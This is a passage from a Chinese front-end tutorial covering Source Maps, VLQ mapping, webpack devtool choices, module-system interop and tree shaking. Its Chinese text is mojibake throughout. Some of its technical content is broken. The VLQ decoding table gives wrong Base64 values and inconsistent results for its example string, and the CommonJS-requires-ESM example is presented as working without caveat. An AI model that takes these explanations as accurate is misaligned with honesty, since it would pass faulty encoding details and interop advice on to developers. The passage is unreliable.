¸å¿ƒåŸç†</strong></p><p>å·¥ä½œåŸç†ç¤ºæ„å›¾ï¼š</p><pre class="mermaid">graph LRA[å‹ç¼©æ··æ·†ä»£ç ] --> B[é”™è¯¯ä½ç½®: ç¬¬3è¡Œç¬¬15åˆ—]B --> C[Source Mapæ–‡ä»¶]C --> D[åŸå§‹ä»£ç ä½ç½®: ç¬¬42è¡Œç¬¬8åˆ—]</pre><p>Source Map æ–‡ä»¶ç»“æ„ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JSON"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">3</span><span class="hljs-punctuation">,</span>                   <span class="hljs-comment">// Source Mapç‰ˆæœ¬</span><br>  <span class="hljs-attr">&quot;sources&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;app.js&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>           <span class="hljs-comment">// æºæ–‡ä»¶åˆ—è¡¨</span><br>  <span class="hljs-attr">&quot;names&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;add&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;multiply&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>    <span class="hljs-comment">// å˜é‡åæ˜ å°„</span><br>  <span class="hljs-attr">&quot;mappings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;AAAA;ACDE;&quot;</span><span class="hljs-punctuation">,</span>        <span class="hljs-comment">// ä½ç½®æ˜ å°„ç¼–ç </span><br>  <span class="hljs-attr">&quot;file&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;app.min.js&quot;</span><span class="hljs-punctuation">,</span>            <span class="hljs-comment">// ç”Ÿæˆçš„æ–‡ä»¶å</span><br>  <span class="hljs-attr">&quot;sourcesContent&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;åŸå§‹ä»£ç &quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>  <span class="hljs-comment">// åŸå§‹æºä»£ç ï¼ˆå¯é€‰ï¼‰</span><br>  <span class="hljs-attr">&quot;sourceRoot&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/src&quot;</span>             <span class="hljs-comment">// æºæ–‡ä»¶æ ¹è·¯å¾„</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><strong>æ˜ å°„ç¼–ç è§£æï¼ˆVLQ åŸç†ï¼‰</strong></p><p>(1) VLQ ç¼–ç ç¤ºä¾‹</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs Text">åŸå§‹ä½ç½® â†’ ç”Ÿæˆä½ç½®<br>ç¬¬2è¡Œç¬¬5åˆ— â†’ ç¬¬1è¡Œç¬¬10åˆ—<br><br>VLQç¼–ç ï¼šCAC1F<br></code></pre></td></tr></table></figure><p>(2) VLQ è§£ç è¿‡ç¨‹</p><table><thead><tr><th align="left">å­—ç¬¦</th><th align="left">Base64å€¼</th><th align="left">äºŒè¿›åˆ¶</th><th align="left">VLQè¿ç»­ä½</th><th align="left">å®é™…å€¼</th></tr></thead><tbody><tr><td align="left">C</td><td align="left">2</td><td align="left">000010</td><td align="left">0</td><td align="left">1</td></tr><tr><td align="left">A</td><td align="left">0</td><td align="left">000000</td><td align="left">1</td><td align="left">0</td></tr><tr><td align="left">C</td><td align="left">2</td><td align="left">000010</td><td align="left">0</td><td align="left">-1</td></tr><tr><td align="left">1</td><td align="left">17</td><td align="left">010001</td><td align="left">0</td><td align="left">8</td></tr><tr><td align="left">F</td><td align="left">5</td><td align="left">000101</td><td align="left">1</td><td align="left">5</td></tr></tbody></table><p>ç»“æœï¼šè¡Œåç§»+1ï¼Œåˆ—åç§»0 â†’ è¡Œåç§»-1ï¼Œåˆ—åç§»8 â†’ åˆ—åç§»+5</p><p><strong>Source Map ç±»å‹å…¨è§£æ</strong></p><p>(1) å¼€å‘ç¯å¢ƒæ¨èç±»å‹</p><table><thead><tr><th align="left">ç±»å‹</th><th align="left">æ„å»ºé€Ÿåº¦</th><th align="left">é‡å»ºé€Ÿåº¦</th><th align="left">è´¨é‡</th><th align="left">é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td align="left">eval</td><td align="left">+++</td><td align="left">+++</td><td align="left">æ— </td><td align="left">è¶…å¿«é€Ÿå¼€å‘</td></tr><tr><td align="left">eval-source-map</td><td align="left">+</td><td align="left">++</td><td align="left">å®Œæ•´</td><td align="left">Create React App é»˜è®¤</td></tr><tr><td align="left">eval-cheap-source-map</td><td align="left">++</td><td align="left">+++</td><td align="left">è¡Œçº§</td><td align="left">å¤§å‹é¡¹ç›®å¼€å‘</td></tr><tr><td align="left">eval-cheap-module-source-map</td><td align="left">++</td><td align="left">+++</td><td align="left">è¡Œçº§</td><td align="left">TypeScripté¡¹ç›®</td></tr></tbody></table><p>(2) ç”Ÿäº§ç¯å¢ƒæ¨èç±»å‹</p><table><thead><tr><th align="left">ç±»å‹</th><th align="left">æ–‡ä»¶å¤§å°</th><th align="left">å®‰å…¨æ€§</th><th align="left">é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td align="left">source-map</td><td align="left">å¤§</td><td align="left">ä½</td><td align="left">éœ€è¦å®Œæ•´æºç æ˜ å°„</td></tr><tr><td align="left">hidden-source-map</td><td align="left">å¤§</td><td align="left">é«˜</td><td align="left">é”™è¯¯ç›‘æ§ç³»ç»Ÿ(Sentry)</td></tr><tr><td align="left">nosources-source-map</td><td align="left">ä¸­</td><td align="left">é«˜</td><td align="left">ç”Ÿäº§ç¯å¢ƒè°ƒè¯•</td></tr><tr><td align="left">cheap-module-source-map</td><td align="left">ä¸­</td><td align="left">ä¸­</td><td align="left">å¹³è¡¡æ€§èƒ½ä¸è°ƒè¯•</td></tr></tbody></table><p><strong>å¸¸è§é—®é¢˜è§£å†³æ–¹æ¡ˆ</strong></p><p>(1) Source Map ä¸ç”Ÿæ•ˆ</p><p>è¯Šæ–­æ­¥éª¤ï¼š</p><ul><li>æ£€æŸ¥æµè§ˆå™¨å¼€å‘è€…å·¥å…·è®¾ç½®ï¼ˆéœ€å¯ç”¨Source Mapï¼‰</li><li>éªŒè¯HTTPå“åº”å¤´æ˜¯å¦åŒ…å« <code>SourceMap: &lt;url&gt;</code></li><li>æ£€æŸ¥.mapæ–‡ä»¶æ˜¯å¦å¯è®¿é—®</li><li>ç¡®è®¤webpacké…ç½®æœªè®¾ç½® devtool: false</li></ul><p><strong>é¢è¯•é‡ç‚¹è§£æ</strong></p><p>(1) ä¸ºä»€ä¹ˆevalèƒ½æå‡æ„å»ºé€Ÿåº¦ï¼Ÿ</p><p>æŠ€æœ¯åŸç†ï¼š</p><ul><li>ä½¿ç”¨ eval() æ‰§è¡Œä»£ç </li><li>æ˜ å°„ä¿¡æ¯å†…è”åœ¨ä»£ç ä¸­ï¼ˆéç‹¬ç«‹æ–‡ä»¶ï¼‰</li><li>æµè§ˆå™¨ç›´æ¥è§£ææ— éœ€åŠ è½½é¢å¤–æ–‡ä»¶</li><li>é¿å…ç£ç›˜I&#x2F;Oæ“ä½œ</li></ul><p>(2) å¦‚ä½•é€‰æ‹©ç”Ÿäº§ç¯å¢ƒçš„Source Mapï¼Ÿ</p><pre class="mermaid">graph LR  A[éœ€æ±‚åˆ†æ] --> B{éœ€è¦è°ƒè¯•ç”Ÿäº§ç¯å¢ƒ?}  B -->|æ˜¯| C{éœ€è¦å®Œæ•´æºç ?}  C -->|æ˜¯| D[source-map]  C -->|å¦| E[nosources-source-map]  B -->|å¦| F{éœ€è¦é”™è¯¯ç›‘æ§?}  F -->|æ˜¯| G[hidden-source-map]  F -->|å¦| H[ä¸ç”ŸæˆSource Map]</pre><p>(3) Source Mapå¦‚ä½•å½±å“æ€§èƒ½ï¼Ÿ</p><p>å½±å“ç»´åº¦ï¼š</p><ul><li>æ„å»ºæ€§èƒ½ï¼šç”Ÿæˆsourcemapå¢åŠ 20%-30%æ„å»ºæ—¶é—´</li><li>æ–‡ä»¶ä¼ è¾“ï¼š.mapæ–‡ä»¶å¢åŠ é¢å¤–ç½‘ç»œè¯·æ±‚</li><li>æµè§ˆå™¨è§£æï¼šåŠ è½½sourcemapå¢åŠ å†…å­˜å ç”¨</li><li>å®‰å…¨é£é™©ï¼šæš´éœ²åŸå§‹ä»£ç ç»“æ„</li></ul><h2 id="1-3-æ¨¡å—åŒ–å…¼å®¹"><a href="#1-3-æ¨¡å—åŒ–å…¼å®¹" class="headerlink" title="1.3 æ¨¡å—åŒ–å…¼å®¹"></a>1.3 æ¨¡å—åŒ–å…¼å®¹</h2><h3 id="1-3-1-ES-Module-CommonJS-AMD-æ··ç”¨å¤„ç†"><a href="#1-3-1-ES-Module-CommonJS-AMD-æ··ç”¨å¤„ç†" class="headerlink" title="1.3.1 ES Module &#x2F; CommonJS &#x2F; AMD æ··ç”¨å¤„ç†"></a>1.3.1 ES Module &#x2F; CommonJS &#x2F; AMD æ··ç”¨å¤„ç†</h3><p><strong>æ¨¡å—ç³»ç»Ÿæ ¸å¿ƒå·®å¼‚å¯¹æ¯”</strong></p><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">ES Module (ESM)</th><th align="left">CommonJS (CJS)</th><th align="left">AMD</th></tr></thead><tbody><tr><td align="left">åŠ è½½æ–¹å¼</td><td align="left">ç¼–è¯‘æ—¶é™æ€åˆ†æ</td><td align="left">è¿è¡Œæ—¶åŠ¨æ€åŠ è½½</td><td align="left">å¼‚æ­¥åŠ è½½</td></tr><tr><td align="left">è¯­æ³•</td><td align="left">import&#x2F;export</td><td align="left">require&#x2F;module.exports</td><td align="left">define&#x2F;require</td></tr><tr><td align="left">é€‚ç”¨ç¯å¢ƒ</td><td align="left">ç°ä»£æµè§ˆå™¨&#x2F;Node.js v12+</td><td align="left">Node.js</td><td align="left">æµè§ˆå™¨</td></tr><tr><td align="left">æ¨¡å—å¯¹è±¡</td><td align="left">åªè¯»å¼•ç”¨</td><td align="left">å€¼æ‹·è´</td><td align="left">å€¼æ‹·è´</td></tr><tr><td align="left">å¾ªç¯ä¾èµ–å¤„ç†</td><td align="left">æ”¯æŒï¼ˆé¢„ç¼–è¯‘è§£å†³ï¼‰</td><td align="left">éƒ¨åˆ†æ”¯æŒï¼ˆè¿è¡Œæ—¶è§£å†³ï¼‰</td><td align="left">æ”¯æŒ</td></tr><tr><td align="left">Tree Shaking</td><td align="left">åŸç”Ÿæ”¯æŒ</td><td align="left">ä¸æ”¯æŒ</td><td align="left">ä¸æ”¯æŒ</td></tr></tbody></table><p><strong>æ··ç”¨åœºæ™¯ä¸‹çš„é—®é¢˜ä¸è§£å†³æ–¹æ¡ˆ</strong></p><p>(1) å¸¸è§æ··ç”¨é—®é¢˜åˆ†æ</p><pre class="mermaid">graph TD  A[æ¨¡å—æ··ç”¨é—®é¢˜] --> B[è¯­æ³•å†²çª]  A --> C[ä½œç”¨åŸŸæ±¡æŸ“]  A --> D[å¾ªç¯ä¾èµ–é£é™©]  A --> E[Tree Shakingå¤±æ•ˆ]    B --> B1[ESMçš„importä¸CJSçš„requireå…±å­˜]  C --> C1[AMDçš„å…¨å±€defineæ±¡æŸ“]  D --> D1[æ¨¡å—é—´ç›¸äº’å¼•ç”¨å¯¼è‡´æ­»é”]  E --> E1[CJSæ¨¡å—æ— æ³•è¢«Tree Shaking]</pre><p>(2) Webpack çš„æ¨¡å—ç»Ÿä¸€å¤„ç†</p><pre class="mermaid">graph LR  A[ESM] --> D[Webpackæ¨¡å—ç³»ç»Ÿ]  B[CJS] --> D  C[AMD] --> D  D --> E[ç»Ÿä¸€æ¨¡å—æ ¼å¼]  E --> F[è¾“å‡ºä¼˜åŒ–ä»£ç ]</pre><p><strong>äº’æ“ä½œå®è·µæŒ‡å—</strong></p><p>(1) ESM å¼•ç”¨ CJS æ¨¡å—</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// CJSæ¨¡å— (math.cjs)</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">add</span>: <span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> a + b,<br>  <span class="hljs-attr">PI</span>: <span class="hljs-number">3.14</span><br>&#125;;<br><br><span class="hljs-comment">// ESMå¼•ç”¨</span><br><span class="hljs-keyword">import</span> math <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./math.cjs&#x27;</span>; <span class="hljs-comment">// é»˜è®¤å¯¼å…¥æ•´ä¸ªå¯¹è±¡</span><br><span class="hljs-keyword">import</span> &#123; add &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./math.cjs&#x27;</span>; <span class="hljs-comment">// å‘½åå¯¼å…¥ - éœ€è¦ç‰¹æ®Šå¤„ç†</span><br><br><span class="hljs-comment">// è§£å†³æ–¹æ¡ˆï¼šCJSæ¨¡å—æ·»åŠ __esModuleæ ‡è®°</span><br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span>, <span class="hljs-string">&#x27;__esModule&#x27;</span>, &#123; <span class="hljs-attr">value</span>: <span class="hljs-literal">true</span> &#125;);<br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">add</span>: <span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> a + b,<br>  <span class="hljs-attr">PI</span>: <span class="hljs-number">3.14</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>(2) CJS å¼•ç”¨ ESM æ¨¡å—</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ESMæ¨¡å— (utils.mjs)</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">log</span> = msg =&gt; <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(msg);<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123; <span class="hljs-attr">version</span>: <span class="hljs-string">&#x27;1.0&#x27;</span> &#125;;<br><br><span class="hljs-comment">// CJSå¼•ç”¨</span><br><span class="hljs-keyword">const</span> utils = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./utils.mjs&#x27;</span>); <span class="hljs-comment">// å¾—åˆ° &#123; default: &#123;...&#125;, log: fn &#125;</span><br><br><span class="hljs-comment">// æ­£ç¡®ä½¿ç”¨æ–¹å¼</span><br><span class="hljs-keyword">const</span> &#123; log &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./utils.mjs&#x27;</span>);<br><span class="hljs-keyword">const</span> defaultExport = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./utils.mjs&#x27;</span>).<span class="hljs-property">default</span>;<br></code></pre></td></tr></table></figure><p>(3) AMD ä¸ ESM&#x2F;CJS äº’æ“ä½œ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// AMDå®šä¹‰æ¨¡å—</span><br><span class="hljs-title function_">define</span>([<span class="hljs-string">&#x27;require&#x27;</span>, <span class="hljs-string">&#x27;exports&#x27;</span>], <span class="hljs-keyword">function</span>(<span class="hljs-params"><span class="hljs-built_in">require</span>, <span class="hljs-built_in">exports</span></span>) &#123;<br>  <span class="hljs-built_in">exports</span>.<span class="hljs-property">sayHello</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// å¼•ç”¨ESMæ¨¡å—</span><br>    <span class="hljs-keyword">const</span> esModule = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./es-module&#x27;</span>);<br>    esModule.<span class="hljs-title function_">hello</span>();<br>  &#125;<br>&#125;);<br><br><span class="hljs-comment">// Webpacké…ç½®æ”¯æŒAMD</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">output</span>: &#123;<br>    <span class="hljs-attr">libraryTarget</span>: <span class="hljs-string">&#x27;amd&#x27;</span> <span class="hljs-comment">// è®¾ç½®è¾“å‡ºæ ¼å¼</span><br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>ä¼ä¸šçº§å®è·µæ¡ˆä¾‹</strong></p><p>(1) æ¸è¿›è¿ç§»ç­–ç•¥</p><pre class="mermaid">graph LR  A[æ—§AMDç³»ç»Ÿ] --> B[åŒ…è£…ä¸ºUMD]  B --> C[æ–°ESMæ¨¡å—]  C --> D[é€æ­¥æ›¿æ¢]    subgraph è¿ç§»è¿‡ç¨‹    B --> E[Webpacké…ç½®å…¼å®¹]    E --> F[åŒæ—¶æ”¯æŒAMD/ESM]  end</pre><p>(2) å¾®å‰ç«¯æ¶æ„ä¸­çš„åº”ç”¨</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ä¸»åº”ç”¨ï¼ˆESMï¼‰</span><br><span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;child-app/cjs-module&#x27;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">module</span> =&gt;</span> &#123;<br>  <span class="hljs-variable language_">module</span>.<span class="hljs-title function_">init</span>();<br>&#125;);<br><br><span class="hljs-comment">// å­åº”ç”¨Webpacké…ç½®</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">output</span>: &#123;<br>    <span class="hljs-attr">library</span>: &#123;<br>      <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;commonjs2&#x27;</span> <span class="hljs-comment">// è¾“å‡ºCJSæ ¼å¼</span><br>    &#125;<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>å¸¸è§é—®é¢˜è§£å†³æ–¹æ¡ˆ</strong></p><p>(1) __esModule æ ‡è®°ç¼ºå¤±</p><p>ç—‡çŠ¶ï¼šå‘½åå¯¼å…¥CJSæ¨¡å—æ—¶æŠ¥é”™</p><p>è§£å†³ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// babel-plugin-transform-esm-to-cjs</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">plugins</span>: [<br>    [<span class="hljs-string">&#x27;@babel/transform-modules-commonjs&#x27;</span>, &#123;<br>      <span class="hljs-attr">strictMode</span>: <span class="hljs-literal">false</span> <span class="hljs-comment">// è‡ªåŠ¨æ·»åŠ __esModuleæ ‡è®°</span><br>    &#125;]<br>  ]<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) ESM ä¸­åŠ¨æ€å¯¼å…¥ CJS</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æ­£ç¡®æ–¹å¼</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">getModule</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"></span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> cjsModule = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./legacy.cjs&#x27;</span>);<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cjsModule.<span class="hljs-property">default</span>); <span class="hljs-comment">// è®¿é—®é»˜è®¤å¯¼å‡º</span><br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>æœ€ä½³å®è·µæ€»ç»“</strong></p><ul><li>ç»Ÿä¸€æ¨¡å—è§„èŒƒï¼š<ul><li>æ–°é¡¹ç›®ä½¿ç”¨ESM</li><li>æ—§é¡¹ç›®é€æ­¥è¿ç§»</li></ul></li><li>æ„å»ºé…ç½®ï¼š</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">resolve</span>: &#123;<br>    <span class="hljs-attr">mainFields</span>: [<br>      <span class="hljs-string">&#x27;browser&#x27;</span>, <br>      <span class="hljs-string">&#x27;module&#x27;</span>, <span class="hljs-comment">// ä¼˜å…ˆESM</span><br>      <span class="hljs-string">&#x27;main&#x27;</span>    <span class="hljs-comment">// å…¶æ¬¡CJS</span><br>    ]<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>ä»£ç è´¨é‡ï¼š<ul><li>ä½¿ç”¨ESLintè§„åˆ™æ£€æµ‹æ··ç”¨é—®é¢˜</li></ul></li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JSON"><span class="hljs-comment">// .eslintrc</span><br><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;rules&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;no-restricted-syntax&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>      <span class="hljs-string">&quot;error&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;selector&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;CallExpression[callee.name=&#x27;require&#x27;]&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;message&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;è¯·ä½¿ç”¨importè¯­æ³•&quot;</span><br>      <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h3 id="1-3-2-Tree-Shakingæ·±å±‚åŸç†ï¼ˆsideEffectsæ ‡å¿—ï¼‰"><a href="#1-3-2-Tree-Shakingæ·±å±‚åŸç†ï¼ˆsideEffectsæ ‡å¿—ï¼‰" class="headerlink" title="1.3.2 Tree Shakingæ·±å±‚åŸç†ï¼ˆsideEffectsæ ‡å¿—ï¼‰"></a>1.3.2 Tree Shakingæ·±å±‚åŸç†ï¼ˆ<code>sideEffects</code>æ ‡å¿—ï¼‰</h3><p><strong>Tree Shaking çš„æœ¬è´¨ä¸é™åˆ¶</strong></p><p>æ ¸å¿ƒåŸç†å›¾è§£ï¼š</p><pre class="mermaid">graph LR  A[åŸå§‹ä»£ç ] --> B[æ„å»ºä¾èµ–å›¾]  B --> C[æ ‡è®°ä½¿ç”¨å¯¼å‡º]  C --> D[åˆ é™¤æœªä½¿ç”¨ä»£ç ]  D --> E[ä¼˜åŒ–åä»£ç ]</pre><p>æŠ€æœ¯å‰ææ¡ä»¶ï¼š</p><ul><li>å¿…é¡»ä½¿ç”¨ ES Module è¯­æ³•ï¼ˆimport&#x2F;exportï¼‰</li><li>æ¨¡å—ä¾èµ–å…³ç³»å¿…é¡»æ˜¯é™æ€å¯åˆ†æçš„</li><li>ç¼–è¯‘å·¥å…·éœ€æ”¯æŒï¼ˆWebpack&#x2F;Rollupç­‰ï¼‰</li></ul><p>CommonJS çš„é™åˆ¶ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æ— æ³•è¢«Tree Shakingçš„CommonJSç¤ºä¾‹</span><br><span class="hljs-keyword">const</span> utils = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./utils&#x27;</span>); <span class="hljs-comment">// åŠ¨æ€å¼•å…¥</span><br><span class="hljs-keyword">const</span> &#123; usedFunc &#125; = utils;       <span class="hljs-comment">// æ— æ³•é™æ€åˆ†æ</span><br></code></pre></td></tr></table></figure><p><strong>sideEffects æ ‡å¿—çš„æ·±å±‚æœºåˆ¶</strong></p><p>é…ç½®æ–¹å¼ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// package.json</span><br>&#123;<br>  <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;my-package&quot;</span>,<br>  <span class="hljs-string">&quot;sideEffects&quot;</span>: <span class="hljs-literal">false</span>, <span class="hljs-comment">// æ•´ä¸ªåŒ…æ— å‰¯ä½œç”¨</span><br>  <span class="hljs-comment">// æˆ–æŒ‡å®šæœ‰å‰¯ä½œç”¨çš„æ–‡ä»¶</span><br>  <span class="hljs-string">&quot;sideEffects&quot;</span>: [<br>    <span class="hljs-string">&quot;*.css&quot;</span>,<br>    <span class="hljs-string">&quot;src/polyfills.js&quot;</span><br>  ]<br>&#125;<br></code></pre></td></tr></table></figure><p>å‰¯ä½œç”¨ç±»å‹åˆ†æï¼š</p><table><thead><tr><th align="left">å‰¯ä½œç”¨ç±»å‹</th><th align="left">ç¤ºä¾‹</th><th align="left">å¤„ç†æ–¹å¼</th></tr></thead><tbody><tr><td align="left">å‡½æ•°è°ƒç”¨å‰¯ä½œç”¨</td><td align="left"><code>window.APP_CONFIG = &#123;&#125;</code></td><td align="left">æ ‡è®°ä¸ºæœ‰å‰¯ä½œç”¨</td></tr><tr><td align="left">CSS å¯¼å…¥å‰¯ä½œç”¨</td><td align="left"><code>import &#39;./styles.css&#39;</code></td><td align="left">éœ€æ˜¾å¼å£°æ˜</td></tr><tr><td align="left">Polyfill å‰¯ä½œç”¨</td><td align="left"><code>import &#39;core-js/stable&#39;</code></td><td align="left">éœ€æ˜¾å¼å£°æ˜</td></tr><tr><td align="left">çº¯å‡½æ•°</td><td align="left"><code>export const add = (a,b) =&gt; a+b</code></td><td align="left">å®‰å…¨åˆ é™¤æœªä½¿ç”¨</td></tr></tbody></table><p><strong>Webpack çš„ Tree Shaking å¤„ç†æµç¨‹</strong></p><p>å®Œæ•´å¤„ç†æµç¨‹ï¼š</p><pre class="mermaid">graph TD  A[æ”¶é›†æ‰€æœ‰å¯¼å‡º] --> B[æ ‡è®°ä½¿ç”¨å¯¼å‡º]  B --> C{æ˜¯å¦æœ‰sideEffectsæ ‡è®°?}  C -->|æ— | D[åˆ é™¤æœªä½¿ç”¨å¯¼å‡º]  C -->|æœ‰| E[åˆ†æå…·ä½“å‰¯ä½œç”¨]  E --> F{å‰¯ä½œç”¨æ˜¯å¦è¢«ä½¿ç”¨?}  F -->|æ˜¯| G[ä¿ç•™æ•´ä¸ªæ¨¡å—]  F -->|å¦| H[åˆ é™¤æ•´ä¸ªæ¨¡å—]</pre><p>å…³é”®ä¼˜åŒ–é˜¶æ®µï¼š</p><ul><li>HarmonyExportï¼šè¯†åˆ«ESMå¯¼å‡º</li><li>FlagDependencyUsageï¼šæ 